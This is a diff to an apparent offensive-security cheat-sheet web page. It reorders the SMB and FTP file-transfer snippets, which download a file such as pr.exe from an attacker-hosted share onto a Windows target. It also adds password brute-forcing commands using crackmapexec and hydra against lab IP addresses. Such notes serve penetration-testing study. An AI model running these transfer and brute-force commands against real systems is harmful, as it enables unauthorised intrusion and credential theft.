@@ -174,17 +174,17 @@ vim -c ':!/bin/sh'                  #vim</code></pre>
                 <h2>SMB</h2>
                 <ul>
                     <p>Open smb server</p>
-                    <pre><code class="language-python">python3 -m pyftpdlib --port 21</code> </pre>
+                    <pre><code class="language-python">impacket-smbserver share . </code> </pre>
                     <p>From windows </p>
-                    <pre><code class="language-python">(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')</code></pre>
+                    <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
                 </ul>
 
                 <h2>FTP</h2>
                 <ul>
                     <p>Open ftp server</p>
-                    <pre><code class="language-python">impacket-smbserver share . </code> </pre>
+                    <pre><code class="language-python">python3 -m pyftpdlib --port 21</code> </pre>
                     <p>From windows </p>
-                    <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
+                    <pre><code class="language-python">(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')</code></pre>
                 </ul>
 
 
@@ -266,10 +266,19 @@ int main() {
             <div class="notion-body">
                 <ul>
                     <p>This are several ways of bruteforcing using crackmapexec</p>
+                    <p>You can always check for default credentials using</p>    
+                    <pre><code class="language-bash">creds search mysql</code></pre>
                     <pre><code class="language-bash">crackmapexec smb 10.10.10.184 -u USERNAME -p passwords.txt
 crackmapexec ftp 10.10.10.184 -u USERNAME -p passwords.txt
 crackmapexec ssh 10.10.10.184 -u USERNAME -p passwords.txt</code></pre>
-                        
+                    
+                    <p>Other examples with hydra</p>
+                    <pre><code class="language-bash">hydra -L user.list -P password.list ssh://10.129.42.197
+hydra -L user.list -P password.list drp://10.129.42.197
+hydra -L user.list -P password.list smb://10.129.42.197</code></pre>
+                   
+                    
+
                    <h2>Useful wordlists to enum website </h2>
 
                    <p>Start with directory listing</p>
@@ -390,7 +399,16 @@ ncat -nv --source-port 53 10.129.2.28 50000 #Then connect to the port</code></pr
                     <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/bashScripting.html">
                         <h2>Check for more information ↗️</h2>
                     </a>
-            </div>  
+            </div>
+            
+            <div class="notion-header">
+                <h1 id="Cracking passwords">Cracking passwords</h1>
+            </div>   
+            <div class="banner">
+                    <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/cracking.html">
+                        <h2>Check for more information ↗️</h2>
+                    </a>
+            </div>
 
             
                     
